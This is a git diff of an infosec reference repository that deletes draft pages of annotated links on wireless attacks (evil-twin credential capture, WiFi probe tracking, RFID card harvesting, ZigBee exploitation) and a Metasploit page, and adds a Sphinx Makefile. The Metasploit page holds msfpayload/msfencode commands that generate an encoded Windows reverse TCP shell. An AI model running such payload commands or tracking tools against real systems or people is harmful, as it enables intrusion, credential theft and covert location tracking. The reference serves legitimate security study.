-	* The starter kit accelerates development, debugging, and demonstration for a wide range of low power wireless applications including IEEE 802.15.4, 6LoWPAN, and ZigBee networks.  The kit includes one USB stick with a 2.4GHz transceiver and a USB connector. The included AT86RF230 transceiver's high sensitivity supports the longest range for wireless products. The AT90USB1287 incorporates fast USB On-the-Go.
-* [Gr0SMoSDR](http://sdr.osmocom.org/trac/wiki/GrOsmoSDR)
-* [PyBOMBS](https://github.com/gnuradio/pybombs)
-	* PyBOMBS (Python Build Overlay Managed Bundle System) is the new GNU Radio install management system for resolving dependencies and pulling in out-of-tree projects. One of the main purposes of PyBOMBS is to aggregate out-of-tree projects, which means that PyBOMBS needs to have new recipes for any new project. We have done a lot of the initial work to get known projects into the PyBOMBS system as is, but we will need project developers for new OOT projects or other projects not currently listed to help us out with this effort.	
-* [UAV Transponders & Tracker Kits - UST](http://www.unmannedsystemstechnology.com/company/sagetech-corporation/) 
-
-
-
-
-### <a name="fxh">Fox Hunting & Wardriving</a>
-Fox Hunting & WarDriving
-* [Practical Foxhunting 101](http://www.irongeek.com/i.php?page=videos/defcon-wireless-village-2014/04-practical-foxhunting-101-simonj)
-* [iSniff](https://github.com/hubert3/iSniff-GPS) 
-	* iSniff GPS passively sniffs for SSID probes, ARPs and MDNS (Bonjour) packets broadcast by nearby iPhones, iPads and other wireless devices. The aim is to collect data which can be used to identify each device and determine previous geographical locations, based solely on information each device discloses about previously joined WiFi networks.
-	* iOS devices transmit ARPs which sometimes contain MAC addresses (BSSIDs) of previously joined WiFi networks, as described in [1]. iSniff GPS captures these ARPs and submits MAC addresses to Apple's WiFi location service (masquerading as an iOS device) to obtain GPS coordinates for a given BSSID. If only SSID probes have been captured for a particular device, iSniff GPS can query network names on wigle.net and visualise possible locations.
-
-
-
-## <a name="80211">802.11 - WiFi</a>
-802.11 WiFi
-* Documentation
-	* [Establishing Wireless Robust Security Networks: A Guide to IEEE 802.11i - NIST](http://csrc.nist.gov/publications/nistpubs/800-97/SP800-97.pdf)
-* Educational
-	* [IEEE 802.11 Tutorial](http://wow.eecs.berkeley.edu/ergen/docs/ieee.pdf)
-		* This document describes IEEE 802.11 Wireless Local Area Network (WLAN) Standard. It describes IEEE 802.11 MAC Layer in detail and it briefly mentions IEEE 802.11a, IEEE 802.11b physical layer standard and IEEE 802.11e MAC layer standard
-	* [Wi-Fi Protected Access 2 (WPA2) Overview](https://technet.microsoft.com/library/bb878054)
-	* [Wireless Leakage - Robin Wood](https://digi.ninja/files/Tech_for_Troops-Wi-Fi_Leakage.pdf)
-* Testing
-	* [Wireless Pentesting on the Cheap](http://securitysynapse.blogspot.com/2013/12/wireless-pentesting-on-cheap-kali-tl.html)
-		* In this article, we proved the capabilities of an inexpensive wireless adapter and a flexible virtualized wireless attack image by breaking into a WEP protected test network.  For just $16 
-	* [WPA/WPA2 Dictionaries](https://wifi0wn.wordpress.com/wepwpawpa2-cracking-dictionary/)
-* Tools
-	* [Aircrack](https://www.aircrack-ng.org/doku.php?id=links)
-	* [SniffAir An Open Source Framework for Wireless Security Assessments Matthew Eidelberg - DerbyCon7](https://www.youtube.com/watch?v=QxVkr-3RK94&app=desktop)
-		* [SniffAir](https://github.com/Tylous/SniffAir)
-	* [Karma](http://www.theta44.org/karma/)
-	* [pixiewps](https://github.com/wiire/pixiewps)
-		* Pixiewps is a tool written in C used to bruteforce offline the WPS pin exploiting the low or non-existing entropy of some APs (pixie dust attack). It is meant for educational purposes only. All credits for the research go to Dominique Bongard.
-	* [eaphammer](https://github.com/s0lst1c3/eaphammer)
-		* EAPHammer is a toolkit for performing targeted evil twin attacks against WPA2-Enterprise networks. It is designed to be used in full scope wireless assessments and red team engagements. As such, focus is placed on providing an easy-to-use interface that can be leveraged to execute powerful wireless attacks with minimal manual configuration. To illustrate how fast this tool is, here's an example of how to setup and execute a credential stealing evil twin attack against a WPA2-TTLS network in just two commands:
-	* [ESP8266 deauther](https://github.com/spacehuhn/esp8266_deauther)
-		* Deauthentication attack and other exploits using an ESP8266!
-	* [probemon](https://github.com/nikharris0/probemon)
-		* A simple command line tool for monitoring and logging 802.11 probe frames
-	* [Infernal-Twin](https://github.com/entropy1337/infernal-twin)
-		* This is the tool created to automate Evil Twin attack and capturing public and guest credentials of Access Point
-* Writeups
-	* [Wireless Password Cracking With Cloud Clusters](http://www.commonexploits.com/wireless-password-cracking-with-cloud-clusters/)
-	* [Exploiting 802.11 Wireless Driver Vulnerabilities on Windows](http://uninformed.org/?v=all&a=29&t=sumry)
-		* This paper describes the process of identifying and exploiting 802.11 wireless device driver vulnerabilities on Windows. This process is described in terms of two steps: pre-exploitation and exploitation. The pre-exploitation step provides a basic introduction to the 802.11 protocol along with a description of the tools and libraries the authors used to create a basic 802.11 protocol fuzzer. The exploitation step describes the common elements of an 802.11 wireless device driver exploit. These elements include things like the underlying payload architecture that is used when executing arbitrary code in kernel-mode on Windows, how this payload architecture has been integrated into the 3.0 version of the Metasploit Framework, and the interface that the Metasploit Framework exposes to make developing 802.11 wireless device driver exploits easy. Finally, three separate real world wireless device driver vulnerabilities are used as case studies to illustrate the application of this process. It is hoped that the description and illustration of this process can be used to show that kernel-mode vulnerabilities can be just as dangerous and just as easy to exploit as user-mode vulnerabilities. In so doing, awareness of the need for more robust kernel-mode exploit prevention technology can be raised. 
-	* [Fingerprinting 802.11 Implementations via Statistical Analysis of the Duration Field](http://uninformed.org/?v=all&a=23&t=sumry)
-		* The research presented in this paper provides the reader with a set of algorithms and techniques that enable the user to remotely determine what chipset and device driver an 802.11 device is using. The technique outlined is entirely passive, and given the amount of features that are being considered for inclusion into the 802.11 standard, seems quite likely that it will increase in precision as the standard marches forward. The implications of this are far ranging. On one hand, the techniques can be used to implement innovative new features in Wireless Intrusion Detection Systems (WIDS). On the other, they can be used to target link layer device driver attacks with much higher precision. 
-	* [Emulation and Exploration of BCM WiFi Frame Parsing using LuaQEMU](https://comsecuris.com/blog/posts/luaqemu_bcm_wifi/)
-	* [WPA Migration Mode:  WEP is back to haunt you...(slides)](http://dl.aircrack-ng.org/wiki-files/doc/technique_papers/Meiners,_Sor_-_WPA_Migration_Mode_WEP_is_back_to_haunt_you_-_slides.pdf)
-		* Migration mode, from Cisco, allows both WEP and WPA clients on the same AP. Besides the fact that the WEP key can be cracked easily, they also bypass the additional security settings offered by Cisco. 
-	* [Predicting, Decrypting, and Abusing WPA2/802.11 Group Keys Mathy Vanhoef and Frank Piessens,  Katholieke Universiteit Leuven](https://www.usenix.org/system/files/conference/usenixsecurity16/sec16_paper_vanhoef.pdf) 
-	* [Wifi Tracking: Collecting the (probe) Breadcrumbs - David Switzer](https://www.youtube.com/watch?v=HzQHWUM8cNo)
-		* Wifi probes have provided giggles via Karma and Wifi Pineapples for years, but is there more fun to be had? Like going from sitting next to someone on a bus, to knowing where they live and hang out? Why try to MITM someone’s wireless device in an enterprise environment where they may notice — when getting them at their favorite burger joint is much easier. In this talk we will review ways of collecting and analyzing probes. We’ll use the resulting data to figure out where people live, their daily habits, and discuss uses (some nice, some not so nice) for this information. We’ll also dicuss how to make yourself a little less easy to track using these methods. Stingrays are price prohibitive, but for just tracking people’s movements.. this is cheap and easy.
-	* [Brute forcing Wi-Fi Protected Setup - Stefan Viehböck](https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf)
-		* The original paper on WPS cracking.
-	* [DEF CON 23 - JoshInGeneral - Meeting People Over WiFi ](https://www.youtube.com/watch?v=9SIMe0yMy78)
-		* In this talk we will talk about some of the things that can identify you in an environment and how people can track you. We will look at bluetooth scanning apps that you can use every day to track people inconspicuously from your phone, while walking, metroing, or as a passenger in a car driving.
-	* [If it fits - it sniffs: Adventures in WarShipping - Larry Pesce](http://www.irongeek.com/i.php?page=videos/derbycon4/t104-if-it-fits-it-sniffs-adventures-in-warshipping-larry-pesce)
-		*  There are plenty of ways to leverage known wireless attacks against our chosen victims. We've discovered a new WiFi discovery methodology that can give us insight into attack paths, internal distribution methods, internal policies and procedures as well as an opportunity to launch wireless attacks deep inside a facility without even stepping inside; no physical penetration test needed. How do we make that happen? Box it, tape it and slap an address on it: WARSHIPPING. Thanks FedEx, UPS and USPS for doing the heavy lifting for us. We?'ve even got a new tool to do some of the heavy lifting for location lookups too!
-
-
-
-### <a name="rfid">RFID - Radio Frequency Identification</a>
-
-| **Security of RFID Protocols A Case Study** | 
-In the context of Dolev-Yao style analysis of security proto cols, we investigate the security claims of a pro- posed strong-security RFID authentication protocol. We ex hibit a flaw which has gone unnoticed in RFID protocol literature and present the resulting attacks on au thentication, untraceability, and desynchroniza- tion resistance. We analyze and discuss the authors proofs of security. References to other vulnerable protocols are given.
-
-[ravenhid](https://github.com/emperorcow/ravenhid)
-* Hardware and software to run a RFID reader to harvest card information. This is the PCB design and Arduino code that will run a RFID reader, allowing you to gather and harvest cards. Typically, a larger reader, such as those in garages, will be more successful, allowing you to ready over a couple feet instead of inches. The board itself is designed to be modular and support multiple methods to output harvested cards once they are read:
-	*	 Text file on a MicroSD card
-*	 Print out to LCD
-*	 Bluetooth Low Energy Arduino serial connection 
-* Each of these options are supported in code, but can be ignored on the PCB. The PCB itself has been designed to use a pluggable module for each of these options, making it easy to ignore, install, or change out which ones you find useful.
-
-[RFIDiggity - Pentester Guide to Hacking HF/NFC and UHF RFID - Defcon23](https://www.youtube.com/watch?v=7o38hyQWw6g)
-
-[NFC Frequently Asked Questions](https://www.securetechalliance.org/publications-nfc-frequently-asked-questions/)
-
-
-
-
-
-### <a name="retroreflectors">RF RetroReflectors</a>
-RetroReflectors
-* [[TROOPERS15] Michael Ossmann - RF Retroflectors, Emission Security and SDR](https://www.youtube.com/watch?v=9DABAS-PCFM)
-* [The NSA Playset - RF Retroreflectors - Defcon22](https://www.youtube.com/watch?v=5gb3C80_wXI)
-* [CONGAFLOCK - NSA Playset](http://www.nsaplayset.org/congaflock)
-	* CONGAFLOCK is a general purpose RF retroreflector intended for experimentation.
-* [The Thing (Listening Device) - Wikipedia](https://en.wikipedia.org/wiki/The_Thing_(listening_device))
-
-
-
-
-### <a name="sdr">Software Defined Radio</a>
-* 101
-	* [Introduction to SDR and the Wireless Village(Defcon)](https://www.youtube.com/watch?v=F9kKo190_oE)
-	* [Software Defined Radio for Infosec People 101](http://garrettgee.com/appearances/software-defined-radio-for-infosec-people-101/)
-* Educational
-	* [So you want to get into SDR talk](http://www.irongeek.com/i.php?page=videos/defcon-wireless-village-2014/01-so-ya-wanna-get-into-sdr-russell-handorf)
-	* [Bringing Software Defined Radio to the Penetration Testing Community](https://www.youtube.com/watch?v=hZJDdz6kVJ4)
-* Documentation
-* General
-	* [PHYs, MACs, and SDRs - Robert Ghilduta](http://www.irongeek.com/i.php?page=videos/defcon-wireless-village-2014/17-phys-macs-and-sdrs-robert-ghilduta)
-		* The talk will touch on a variety of topics and projects that have been under development including YateBTS, PHYs, MACs, and GNURadio modules. The talk will deal with GSM/LTE/WiFi protocol stacks.
-	* [RTL-SDR and GNU Radio with Realtek RTL2832U [Elonics E4000/Raphael Micro R820T] software defined radio receivers.](http://superkuh.com/rtlsdr.html)
-* Tools
-	* [GNU Radio](http://gnuradio.org/redmine/projects/gnuradio/wiki)
-		* GNU Radio is a free & open-source software development toolkit that provides signal processing blocks to implement software radios. It can be used with readily-available low-cost external RF hardware to create software-defined radios, or without hardware in a simulation-like environment. It is widely used in hobbyist, academic and commercial environments to support both wireless communications research and real-world radio systems.
-	* [Gqrx](http://gqrx.dk/)
-		* Gqrx is a software defined radio receiver powered by the GNU Radio SDR framework and the Qt graphical toolkit.
-		* [Documentation](http://gqrx.dk/category/doc)
-		* [Practical Tips & Tricks](http://gqrx.dk/doc/practical-tricks-and-tips)
-	* [GPS-SDR-SIM](https://github.com/osqzss/gps-sdr-sim)
-		* Software-Defined GPS Signal Simulator; GPS-SDR-SIM
-	* [nrsc5](https://github.com/theori-io/nrsc5)
-		* NRSC-5 receiver for rtl-sdr
-	* [rtlamr](https://github.com/bemasher/rtlamr)
-		* An rtl-sdr receiver for Itron ERT compatible smart meters operating in the 900MHz ISM band. 
-	* [Uni-SDR Link](https://github.com/ms-dev-1/uni-sdr-link/releases)
-		* The initial release of Uni-SDR Link. This applications sole purpose is to allow Universal Trunker (aka Unitrunker) to control the tuning frequency of individual VFO's in SDR Console v2. This is achieved by translating Unitrunker Receiver Control commands into a format accepted by SDR Console. Communication occurs over virtual com / serial ports.
-	* [ShinySDR](https://github.com/kpreid/shinysdr)
-		* This is the software component of a software-defined radio receiver. When combined with hardware devices such as the USRP, RTL-SDR, or HackRF, it can be used to listen to a wide variety of radio transmissions, and can be extended via plugins to support even more modes.
-	* [Scapy-Radio](https://bitbucket.org/cybertools/scapy-radio/src)
-		* This tool is a modified version of scapy that aims at providing an quick and efficient pentest tool with RF capabilities. A modified version of scapy that can leverage GNU Radio to handle a SDR card. 
-	* [Universal Radio Hacker](https://github.com/jopohl/urh)
-* Writeups
-	* [Software Defined Radio with HackRF](https://greatscottgadgets.com/sdr/[WebSDR](http://websdr.org/)
-		* A WebSDR is a Software-Defined Radio receiver connected to the internet, allowing many listeners to listen and tune it simultaneously. SDR technology makes it possible that all listeners tune independently, and thus listen to different signals; this is in contrast to the many classical receivers that are already available via the internet.
-	* [Hacking the Wireless World with Software Defined Radio 2.0](http://www.irongeek.com/i.php?page=videos/defcon-wireless-village-2014/14-hacking-the-wireless-world-with-software-defined-radio-2-0-balint-seeber)
-	* [Exploit: Hacking the Wireless World with Software Defined Radio BlackHat USA 2014](https://www.youtube.com/watch?v=XWbwFfxzw6w) 
-	* [From baseband to bitstream and back again: What security researchers really want to do with SDR - Andy Davis - nccgroup](https://cansecwest.com/slides/2015/From_Baseband_to_bitstream_Andy_Davis.pdf)
-	* [Using Software Defined radio to attack Smart home systems](https://www.sans.org/reading-room/whitepapers/threats/software-defined-radio-attack-smart-home-systems-35922)
-	* [Using Software Defined Radio for IoT Analysis](https://www.irongeek.com/i.php?page=videos/bsidesnova2017/102-using-software-defined-radio-for-iot-analysis-samantha-palazzolo)
-	* [Decoding the LoRa IoT Protocol with an RTL-SDR](http://www.rtl-sdr.com/decoding-the-iot-lora-protocol-with-an-rtl-sdr/)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-### <a name="zigbee">Zigbee Wireless Networks</a>
-
-[KillerBee](https://github.com/riverloopsec/killerbee)
-* Framework and Tools for Attacking ZigBee and IEEE 802.15.4 networks.
-
-[KillerBee Framework](https://code.google.com/p/killerbee/)
-* KillerBee is a Python based framework and tool set for exploring and exploiting the security of ZigBee and IEEE 802.15.4 networks. Using KillerBee tools and a compatible IEEE 802.15.4 radio interface, you can eavesdrop on ZigBee networks, replay traffic, attack cryptosystems and much more. Using the KillerBee framework, you can build your own tools, implement ZigBee fuzzing, emulate and attack end-devices, routers and coordinators and much more. 
-
-[SecBee](https://github.com/Cognosec/SecBee)
-* SecBee is a ZigBee security testing tool developed by Cognosec. The goal is to enable developers and security testers to test ZigBee implementations for security issues.
-
-[Frony Fronius - Exploring Zigbee signals from Solar City](https://www.irongeek.com/i.php?page=videos/bsidescharm2017/bsidescharm-2017-t102-frony-fronius-exploring-zigbee-signals-from-solar-city-jose-fernandez)
-* Solar equipment is becoming more readily used in homes and businesses due to cost savings, eco-friendly conservationism and current tax incentives. Companies like SolarCity use Power Inverters/Meters from 3rd parties in order to provide it's services while making the solution affordable for customers. This research will focus on understanding the communication between the Inverter, Internet Gateway and web portal used to view electrical consumption of subscriber.
-
-[ZigBee Exploited: The good, the bad and the ugly - Tobias Zillner](http://www.sicherheitsforschung-magdeburg.de/uploads/journal/MJS_045_Zillner_ZigBee.pdf)
-
-
-
-
-### <a name="zwave">Z-Wave</a>
-[Stealthy and Persistent Back Door for Z-Wave Gateways](http://www.irongeek.com/i.php?page=videos/derbycon5/stable18-stealthy-and-persistent-back-door-for-z-wave-gateways-jonathan-fuller-ben-ramsey)
-* Z-Wave is a proprietary wireless protocol that is gaining market share in home automation and security systems. However, very little work has been done to investigate the security implications of these sub-GHz devices. In this talk we review recent work on hacking Z-Wave networks, and introduce a new attack that creates a persistent back door. This attack maintains a stealthy, parallel, and persistent control channel with all Z-Wave devices in the home. We will demonstrate the attack against a commercial Z-Wave security system.
-
-[Honey, I'm Home!! Hacking Z-Wave Home Automation Systems - video](https://www.youtube.com/watch?v=KYaEQhvodc8)
-* [Slides - PDF](https://cybergibbons.com/wp-content/uploads/2014/11/honeyimhome-131001042426-phpapp01.pdf)
-
-
-
-
-
-
diff --git a/Draft/config.json b/Draft/config.json
deleted file mode 100644
index d6fa2ca..0000000
--- a/Draft/config.json
+++ /dev/null
@@ -1,8 +0,0 @@
-{
-    "title": "InfoSec Reference",
-    "tagline": "A Reference that doesn't suck",
-    "ignore": {
-        "files": ["4.md"],
-        "folders": ["99_Not_Ready"]
-    }
-}
\ No newline at end of file
diff --git a/Draft/index.md b/Draft/index.md
deleted file mode 100644
index 652fe10..0000000
--- a/Draft/index.md
+++ /dev/null
@@ -1,5 +0,0 @@
-{
-        "title": "InfoSec Reference",
-        "tagline": "An Infosec reference that doesn't suck.",
-        "image": "mspaint.png"
-}
diff --git a/Draft/metasploit.md b/Draft/metasploit.md
deleted file mode 100644
index ffde55c..0000000
--- a/Draft/metasploit.md
+++ /dev/null
@@ -1,86 +0,0 @@
-# Metasploit Framework
-
-
-
-
-
-
-
-
-### General
-
-[What is Metasploit?](https://www.youtube.com/watch?v=TCPyoWHy4eA)
-
-[Metasploit - github.io](https://metasploit.github.io/)
-* It is the official “reference” page for the metasploit framework
-
-[Facts and Myths about AV Evasion with the Metasploit Framework](http://schierlm.users.sourceforge.net/avevasion.html)
-
-[MSF/Meterpreter cmd reference](http://hacking-class.blogspot.com/2011/08/metasploit-cheat-sheet-metasploit.html)
-
-[Empire - Powershell Post-Exploitation Agent](http://www.powershellempire.com/)
-* Empire is a pure PowerShell post-exploitation agent built on cryptologically-secure communications and a flexible architecture. Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from key loggers to Mimikatz, and adaptable communications to evade network detection, all wrapped up in a usability-focused framework.
-
-
-
-http://it-ovid.blogspot.com/2012/02/metasploit-and-meterpreter.html
-
-Metasploit Framework - Payload Encoding
-List all available payloads and search for windows reverse tcp shellsmsfpayload -l | grep windows | grep shell | grep reverse | tcp
-
-List available encoders 
-msfencode -l 
-
-Reverse self-contained (not staged) command shell: 341 bytes 
-msfpayload windows/shell_reverse_tcp LHOST=192.168.6.1 R | msfencode -e x86/shikata_ga_nai -b '\x00\x0a\x0b\x0d\x90' -t c
-
-msfpayload windows/shell_reverse_tcp LHOST=192.168.6.1 R | msfencode -e x86/shikata_ga_nai -b '\x00\x0a\x0b\x0d\x90' -t c
-
-Windows Command Shell, reverse Ordinal TCP Stager (Np NX or Win7) 
-Use msf multi/handler to listen and upload remainder of the shellcode (stage 2)
-
-msfpayload windows/shell/reverse_ord_tcp LHOST=192.168.6.1 R | msfencode -e x86/shikata_ga_nai -b '\x00\x0a\x0b\x0d\x90' -t c
-Generic Syntax
-
-msfpayload <payload> <options> <output>| ./msfencode -e <encoder> -b <bad bytes> -t <output format>
-
-Contributing to Metasploit
-
-
-[Writing an Exploit](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-an-exploit)
-[Writing an Exploit for Metasploit by Corelan](https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/)
-[Writing an Auxiliary module](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-an-auxiliary-module)
-
-[Writing a Post-Exploitation module](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-a-post-module)
-[Style tips for writing a Metasploit module](https://github.com/rapid7/metasploit-framework/wiki/Style-Tips)
-
-
-
-[Metasploit Framework Module Github](https://github.com/rapid7/metasploit-framework/tree/master/modules)
-* Easiest way of seeing the most current listing of any modules.
-* All are Github pages for the Metasploit project
-
-
-*  [Metasploit Framework Wiki](https://github.com/rapid7/metasploit-framework/wiki)
-*  [Auxiliary Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary)
-*  [Auxiliary Module Fuzzers](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/fuzzers)
-*  [Denial-of-Service Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/dos)
-*  [Auxiliary Gather Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/gather)
-*  [Auxiliary Scanner Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/scanner)
-*  [Server Auxiliary Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/server)
-*  [Auxiliary Spoofing Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/spoof)
-*  [Auxiliary VOIP Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/voip)
-*  [Encoder Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/encoders)
-*  [Payloads - Singles](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/singles)
-*  [Payloads - Singles - Windows](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/singles/windows)
-*  [Payloads - Singles - Linux x86](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/singles/linux/x86)
-*  [Payloads - Stagers](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/stagers)
-*  [Payloads - Stagers - Windows](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/stagers/windows)
-*  [Payloads - Stagers - Linux x86](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/stagers/linux/x86)
-*  [Exploits](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits)
-*  [Exploits - Windows](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/windows)
-*  [Exploits - Linux])https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux)
-*  [Exploits - Multi-Platform](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/multi)
-*  [Post-Exploitation Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/post)
-*  [Post-Exploitation Windows Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/post/windows)
-*  [Post-Exploitation Linux Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/post/linux)
diff --git a/Draft/readme.md b/Draft/readme.md
deleted file mode 100644
index 0e9d586..0000000
--- a/Draft/readme.md
+++ /dev/null
@@ -1,3 +0,0 @@
-# Readme
-
-if you give a man a fish he is hungry again in an hour. If you teach him to catch a fish you do him a good turn.
\ No newline at end of file
diff --git a/Draft/things-added.md b/Draft/things-added.md
deleted file mode 100755
index c542182..0000000
--- a/Draft/things-added.md
+++ /dev/null
@@ -1,344 +0,0 @@
--------------
-### ATT&CK
-
-[Script Task - SQL Server](https://docs.microsoft.com/en-us/sql/integration-services/control-flow/script-tas)k
-
-[Cloakify](https://github.com/TryCatchHCF/Cloakify)
-* CloakifyFactory & the Cloakify Toolset - Data Exfiltration & Infiltration In Plain Sight; Evade DLP/MLS Devices; Social Engineering of Analysts; Defeat Data Whitelisting Controls; Evade AV Detection. Text-based steganography usings lists. Convert any file type (e.g. executables, Office, Zip, images) into a list of everyday strings. Very simple tools, powerful concept, limited only by your imagination.
-
-[BigPhish](https://github.com/Psychotrope37/bigphish)
-* This issue has been resolved by Apple in MacOS Sierra by enabling tty_tickets by default. NOTE: All other MacOS operation system (El Capitan, Yosemite, Mavericks etc...) still remain vulnerable to this exploit.
-
-
-
-------------
-## Anonymity/Privacy
-
-
-
-
-------------
-## Basic Security Info
-
-
-
-------------
-## BIOS/UEFI
-
-
-------------
-## Building a Lab 
-
-
-------------
-## Car Hacking
-
-
-
-------------
-## Conferences
-
-
-
-
-
-
-
-------------
-## Courses
-
-
-
-------------
-## CTF
-
-
-
-------------
-## Crypto
-
-------------
-## Crypto Currencies
-
-
-
-
-------------
-## Data Analysis/Visualization
-
-
-------------
-## Design
-
-
-
-
-
-------------
-## Disclosure
-
-
-------------
-## Drones
-
-
-
-
-
-
-
-------------
-## Documentation/Technical writing
-
-
-
-
-------------
-## Embedded Devices/Hardware (Including Printers & PoS)
-
-
-
-
-
-
-
-------------
-## Exfiltration
-
-
-
-
-
-------------
-## Exploit Dev
-
-
-
-
-
-------------
-## Forensics
-
-
-
-
-
-------------
-## Fuzzing/Bug Hunting
-
-
-
-
-
-
-
-------------
-## Game Hacking
-
-
-
-
-
-
-------------
-## Honeypots
-
-
-
-		
-------------
-## ICS/SCADA
-
-
-
-
-
-
-------------
-## Interesting Things
-
-
-
-------------
-## Lockpicking
-
-
-
-
-
-------------
-## Malware
-
-
-
-
-------------
-## Mainframes
-
-
-
-
-
-------------
-## Network Scanning and Attacks
-
-
-
-
-
-------------
-## Network Monitoring & Logging & Threat Hunting
-
-
-
-------------
-## OSINT
-
-
-------------
-##	OS X
-
-
-
-
-
-
-------------
-## Password Cracking
-
-
-
-
-
-
-
-------------
-## Phishing
-
-
-
-
-------------
-## Physical Security
-
-
-
-
-
-
-
-
-
-
-
-------------
-## Policy
-
-
-
-
-
-------------
-## Post Exploitation/Privilege Escalation
-[
-
-
-------------
-## Programming:
-
-
-
-
-
-
-
-------------
-## RE
-
-
-
-
-
-
-
-
-
-
-------------
-## Red Team/Adversary Simulation/Pentesting 
-
-
-
-
-------------
-## Rootkits
-
-
-
-
-
-
-
-------------
-## SCADA / Heavy Machinery
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-------------
-## Social Engineering
-
-
-
-
-
-------------
-## System Internals
-
-
-
-
-
-------------
-## Threat Modeling & Analysis
-
-
-
-
-
---------------
-## UI
-
-
-
-
-
-
-
-
-
-------------
-## Web: 
-
-
-
-
-
-
-
-
-
-------------
-## Wireless Stuff
diff --git a/Makefile b/Makefile
new file mode 100644
index 0000000..d3ae99c
--- /dev/null
+++ b/Makefile
@@ -0,0 +1,20 @@
+# Minimal makefile for Sphinx documentation
+#
+
+# You can set these variables from the command line.
+SPHINXOPTS    =
+SPHINXBUILD   = sphinx-build
+SPHINXPROJ    = InfosecReference
+SOURCEDIR     = source
+BUILDDIR      = build
+
+# Put it first so that "make" without argument is like "make help".
+help:
+	@$(SPHINXBUILD) -M help "$(SOURCEDIR)" "$(BUILDDIR)" $(SPHINXOPTS) $(O)
+
+.PHONY: help Makefile
+
+# Catch-all target: route all unknown targets to Sphinx using the new
+# "make mode" option.  $(O) is meant as a shortcut for $(SPHINXOPTS).
+%: Makefile
+	@$(SPHINXBUILD) -M $@ "$(SOURCEDIR)" "$(BUILDDIR)" $(SPHINXOPTS) $(O)
\ No newline at end of file
diff --git a/README.md b/README.md
old mode 100755
new mode 100644
index 8494336..cd22408
--- a/README.md
+++ b/README.md
@@ -1,127 +1,80 @@
-# Infosec_Reference
-
-An Information Security Reference That Doesn't Suck
-
-
-#### Goal:
-* Be an awesome Information Security Reference
-* List of techinques, tools and tactics to learn from/reference.
-	* Something like a "Yellow Pages" in the sense of you know something exists, but what was it called....
-* End goal: Rich resource of infosec knowledge for anyone to browse through as a jumping off point for various niches OR as a reference/recall method for stuff.
-	* 'if you give a man a fish he is hungry again in an hour. If you teach him to catch a fish you do him a good turn.'
-* Something oppposite to the [MITRE ATT&CK Framework](https://attack.mitre.org/wiki/Main_Page) (eventually; As in, "I want to do priv esc on OS X/windows/linux, what methods are there?" or, "I need to do X under Y situation". Focus is on attacks and how they're done vs how attacks are done with a focus on defense.
-	* Always accepting more links/stuff. Feel free to contribue or suggest something.
-
-#### Why Do *I* Care?
-* No idea. I do this as a resource for myself(to teach others from) and offer it publicly as a way of giving back to the general community.
-* To be clear, these aren't personal notes. I keep this repo maintained as a way of having pointers to information that I feel help build someone's skillset or increase understanding of attacks/methods/defenses.
-
-#### Why Do *You* Care?
-* Don't have to constantly google for tools/reminder. 
-* Easily browsable list of tools, techniques, papers, and research in all sorts of areas.
-* Want to read some good info.
-
-
-##### This page
-* This page is terrible on mobile. Use [https://rmusser.net/docs](https://rmusser.net/docs]) for better mobile formatting.
-	* At some point I will sort the sections into a grid alphabetically.
-* For latest content updates, check here: [Things added since last update](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/things-added.md)
-	* This will have all links added to the other pages sorted according to topic, making it easier to see new stuff.
-* All links on this page should work. Last tested 11/26
-* Contributions are welcome, format is pretty simple/easy to pick up, add anything not already in it that fits.
-
-
-### Index - Table of Contents
-------------------------------
-
-#### ATT&CK(Def3nse?) Stuff
-Windows
-* [Windows Collection](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Windows/Windows_Collection.md)
-* [Windows Command and Control](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Windows/Windows_Command_and_Control.md)
-* [Windows Credential Access](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Windows/Windows_Credential_Access.md)
-* [Windows Defense Evasion](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Windows/Windows_Defense_Evasion.md)
-* [Windows Discovery](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Windows/Windows_Discovery.md)
-* [Windows Execution](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Windows/Windows_Execution.md)
-* [Windows Exfiltration](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Windows/Windows_Exfiltration.md)
-* [Windows Lateral Movement](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/Windows/Windows_Lateral_Movement.md)
